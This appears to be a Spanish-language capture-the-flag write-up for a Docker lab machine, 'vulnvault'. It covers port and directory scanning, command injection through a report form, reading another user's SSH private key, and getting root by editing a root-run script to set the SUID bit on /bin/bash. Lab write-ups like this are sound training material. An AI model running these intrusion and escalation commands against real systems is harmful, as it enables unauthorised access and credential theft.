---
Maquina: vulnvault
SO: Linux
Explotación: Análisis de web
Escala_privs: Permisos sudo / Procesos root
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - linux
  - escala_privs
  - web
  - wordpress
---

## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sVC -Pn 172.17.0.2
```

![[Pasted image 20241111193806.png]]

Pues como siempre, vamos a analizar el portal web para saber a que nos enfrentamos.

![[Pasted image 20241111193934.png]]

Muy chula la web! por ahora veo varias cosas que hacer, pero lo primero lo primero, hay que ser metódico en el trabajo.

Vamos a analizar el código fuente y ver si vemos algo... Tras revisar un rato no parece haber nada.

Vamos a buscar subdirectorios a ver si nos ocultan algo...

```bash
gobuster dir -u http://172.17.0.2 -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.py,.js,.txt
```

Encontramos lo siguiente ->

![[Pasted image 20241111194505.png]]

Nada fuera de lo común, pero podemos ver algún script de como se gestionan las subidas de archivos...

Vamos a probar a ver si podemos subir cualquier archivo (php) a la página web... Parece que si que deja... pero no parece que los almacene en ningún lado...

Vamos a tener que pasar a crear un reporte en la página principal ->

![[Pasted image 20241112100450.png]]

Y si nos dirigimos a http://172.17.0.2/reportes/ podemos apreciar el reporte que acabamos de crear ->

![[Pasted image 20241112100636.png]]

![[Pasted image 20241112100645.png]]

Ahora vamos si podemos sabotear el concepto este de los reportes...

![[Pasted image 20241112100830.png]]

Fijaos en el segundo reporte, como se puede apreciar ha hecho un listado de directorios... Podemos estar delante de un RCE.

Si exploramos un poco por el sistema de archivos del servidor podemos encontrar lo siguiente ->

![[Pasted image 20241112101712.png]]

Pero por desgracia no nos da información de valor :c. Otra cosa interesante que podemos hacer es un ->

```bash
cat /home/samara/.ssh/id_rsa
```

Esto porque como vemos que tiene un SSH activo nos podría valer para poder realizar una conexión mediante el certificado id_rsa.

![[Pasted image 20241112102018.png]]

Ahora lo que tendríamos que hacer es ->

```bash
nano id_rsa #copiamos el id_rsa de samara
chmod 600 id_rsa #ponemos pocos permisos al id_rsa
ssh -i id_rsa samara@ip #nos conectamos al ssh a través del id_rsa
```

![[Pasted image 20241112102156.png]]

Estamos dentro :3. Ahora podemos explorar un poco los archivos que no teníamos permisos que me dan mucha curiosidad >.<.

![[Pasted image 20241112102252.png]]

uyuyuy un mensaje codificado.... más curiosodad >_< 

Pero es importante que primero veamos los permisos que tenemos... Resulta que el sudo no está permitido en el sistema... volvemos al mensaje cifrado -> 030208509edea7480a10b84baca3df3e. Pero al tratar de descifrarlo no encontramos nada...

Voy a pasar el famoso script de linpeas.sh por el sistema y podemos encontrar lo siguiente ->

![[Pasted image 20241112104113.png]]

Nos encontramos que ese es el script que genera el message.txt del usuario de samara ->

![[Pasted image 20241112104745.png]]

Así que lo modificados para que sea... más útil ->

```bash
#!/bin/bash

echo "Te cambio los permisos del /bin/bash para que puedas entrar ;)." > /home/samara/message.txt

chmod u+s /bin/bash
```

Y vemos que automáticamente se modifica el message.txt de samara ->

![[Pasted image 20241112104847.png]]

Y nada vamos a ver si podemos acceder a root.

![[Pasted image 20241112104912.png]]

Pues ya tenemos los privilegios deseados ;)